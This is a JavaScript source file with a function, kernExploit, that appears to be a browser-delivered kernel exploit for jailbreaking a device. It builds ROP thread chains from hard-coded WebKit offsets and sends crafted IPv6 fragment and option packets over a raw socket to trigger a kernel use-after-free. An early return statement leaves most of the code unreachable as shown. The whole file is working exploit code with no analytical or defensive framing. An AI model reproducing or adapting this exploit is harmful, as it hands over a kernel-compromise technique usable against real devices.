function kernExploit() {
  try {
    var offsetToWebKit = function (o) {
      return window.webKitBase.add32(o);
    }

    debug_log("did we make it?");
    return;

    // If we don't already have a jailbreak, load the other page first
    var testIfJailbroken = p.syscall(23, 0);
    debug_log("jailbreak test: " + testIfJailbroken);
    if (testIfJailbroken != "0") {
      debug_log("redirect");
      window.location.href = "index-bpf.html";
      return;
    }

    alert("Run?");

    var AF_INET6  = 28;
    var SOCK_RAW  = 3;

    var IPPROTO_HOPOPTS   = 0;
    var IPPROTO_IPV6      = 41;
    var IPPROTO_FRAGMENT  = 44;
    var IPPROTO_ICMPV6    = 58;
    var IPPROTO_DSTOPTS   = 60;
    var IPPROTO_RAW       = 255;

    var IP6OPT_PADN       = 1;
    var IP6F_MORE_FRAG    = 1;

    var uafSock = p.syscall(97, AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);

    debug_log("Created UAF socket: " + uafSock);

    // Spawn thread
    var spawnthread = function (name, chain) {
      var longjmp = window.webKitBase.add32(0x14e8);
      var createThread = window.webKitBase.add32(0x779390);
      var contextp = p.malloc32(0x2000);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      var thread2 = new rop();
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      chain(thread2);
      p.write8(contextp, window.gadgets["ret"]);
      p.write8(contextp.add32(0x10), thread2.stackBase);
      p.syscall(324, 1);
      var retv = function () { p.fcall(createThread, longjmp, contextp, p.stringify(name)); }
      window.nogc.push(contextp);
      window.nogc.push(thread2);
      return retv;
    }

    // struct sockaddr_in6 {
    //   uint8_t         sin6_len;        // 0x00 (size: 0x01)
    //   sa_family_t     sin6_family;     // 0x01 (size: 0x01)
    //   in_port_t       sin6_port;       // 0x02 (size: 0x02)
    //   uint32_t        sin6_flowinfo;   // 0x04 (size: 0x04)
    //   struct in6_addr sin6_addr;       // 0x08 (size: 0x10)
    //   uint32_t        sin6_scope_id;   // 0x18 (size: 0x04)
    // };                                 // size: 0x1C
    var connAddr = p.malloc(0x1C);
    p.write8(connAddr.add32(0x00), 0x1C);
    p.write8(connAddr.add32(0x01), AF_INET6);
    p.write8(connAddr.add32(0x02), 0);
    p.write8(connAddr.add32(0x08), 0x400720);
    p.write8(connAddr.add32(0x10), 0x400540);
    
    // struct ip6_hbh {
    //   uint8_t ip6h_nxt;       // 0x00 (size: 0x01)
    //   uint8_t ip6h_len;       // 0x01 (size: 0x01)
    // } __packed;                 // size: 0x02 packed
    // 
    // struct ip6_opt {
    //   uint8_t ip6o_type;      // 0x00 (size: 0x01)
    //   uint8_t ip6o_len;       // 0x01 (size: 0x01)
    // } __packed;                 // size: 0x02 packed
    // 
    // struct ip6_frag {           
    //   uint8_t  ip6f_nxt;      // 0x00 (size: 0x01)
    //   uint8_t  ip6f_reserved; // 0x01 (size: 0x01)
    //   uint16_t ip6f_offlg;    // 0x02 (size: 0x02)
    //   uint32_t ip6f_ident;    // 0x04 (size: 0x04)
    // } __packed;                 // size: 0x08 packed
    // 
    // struct ip6_dest {
    //     uint8_t ip6d_nxt;       // 0x00 (size: 0x01)
    //     uint8_t ip6d_len;       // 0x01 (size: 0x01)
    // } __packed;                 // size: 0x02 packed

    // struct packet1 {
    //   struct ip6_hbh hbh;       // 0x00 (size: 0x02)
    //   struct ip6_opt hbh_opt;   // 0x02 (size: 0x02)
    //   uint8_t hbh_pad[4];       // 0x04 (size: 0x04)
    //   struct ip6_frag frag;     // 0x08 (size: 0x08)
    //   struct ip6_dest dest;     // 0x10 (size: 0x02)
    //   struct ip6_opt dest_opt;  // 0x12 (size: 0x02)
    //   uint8_t dest_pad[4];      // 0x14 (size: 0x04)
    // }                           // size: 0x18
    var packet1 = p.malloc(0x18);
    packet1.backing[0x00 + 0x00] = IPPROTO_FRAGMENT;
    packet1.backing[0x00 + 0x01] = 0;
    packet1.backing[0x02 + 0x00] = IP6OPT_PADN;
    packet1.backing[0x02 + 0x01] = 4;
    packet1.backing[0x08 + 0x00] = IPPROTO_DSTOPTS;
    packet1.backing[0x08 + 0x01] = 0;
    packet1.backing[0x08 + 0x02] = IP6F_MORE_FRAG;
    p.write4(packet1.add32(0x08 + 0x04), 1337); 
    packet1.backing[0x10 + 0x00] = IPPROTO_RAW;
    packet1.backing[0x10 + 0x01] = 1;
    packet1.backing[0x12 + 0x00] = IP6OPT_PADN;
    packet1.backing[0x12 + 0x01] = 4;

    // struct packet2 {
    //   struct ip6_hbh hbh;       // 0x00 (size: 0x02)
    //   struct ip6_opt hbh_opt;   // 0x02 (size: 0x02)
    //   uint8_t hbh_pad[4];       // 0x04 (size: 0x04)
    //   struct ip6_frag frag;     // 0x08 (size: 0x08)
    //   struct ip6_opt dest_opt;  // 0x10 (size: 0x02)
    //   uint8_t dest_pad[6];      // 0x12 (size: 0x06)
    //   uint8_t payload[16];      // 0x18 (size: 0x10)
    // };                          // size: 0x20
    var packet2 = p.malloc(0x20);
    packet2.backing[0x00 + 0x00] = IPPROTO_FRAGMENT;
    packet2.backing[0x00 + 0x01] = 0;
    packet2.backing[0x02 + 0x00] = IP6OPT_PADN;
    packet2.backing[0x02 + 0x01] = 4;
    packet2.backing[0x08 + 0x00] = IPPROTO_DSTOPTS;
    packet2.backing[0x08 + 0x01] = 0;
    packet2.backing[0x08 + 0x02] = 0x00;
    packet2.backing[0x08 + 0x03] = 0x08; // 0x800
    p.write4(packet2.add32(0x08 + 0x04), 1337); 
    packet2.backing[0x12 + 0x00] = IP6OPT_PADN;
    packet2.backing[0x12 + 0x01] = 6;

    p.syscall(133, uafSock, packet1, 0x18, 0, connAddr, 0x1C);
    p.syscall(133, uafSock, packet2, 0x20, 0, connAddr, 0x1C);
    p.syscall(6, uafSock);

    debug_log("We reached *the end*");
    debug_log("================================");
  } catch(ex) {
    //fail(ex)
    debug_log("[ERROR] " + ex)
  }

  // failed
  return false;
}

kernExploit();
